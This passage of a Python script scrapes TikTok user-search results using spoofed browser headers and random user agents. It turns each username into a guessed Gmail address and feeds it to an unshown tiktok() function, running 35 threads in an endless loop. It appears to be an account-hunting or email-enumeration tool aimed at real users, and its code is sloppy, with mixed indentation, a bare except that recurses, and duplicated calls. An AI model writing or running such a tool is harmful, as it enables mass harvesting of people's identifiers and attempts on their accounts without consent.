                'referer': 'https://www.tiktok.com/search/user?q=its.veba&t=1671705430400',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Linux"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': generate_user_agent()}	
	req1 = requests.get(url,headers=he).json()
	looop=0
	try:
		     while True:
		     	looop += 1
		     	email = req1['user_list'][looop]['user_info']['unique_id']
		     	email = email+'@gmail.com'
		     	if '_' in email:
                         continue
		     	else:
                         tiktok(email)

	except:
		pass
		loop()
while True:   
 Threads=[] 
 for t in range(35):
  x = threading.Thread(target=loop)
  x.start()
  Threads.append(x)
 for Th in Threads:
  Th.join()
  start()
  start()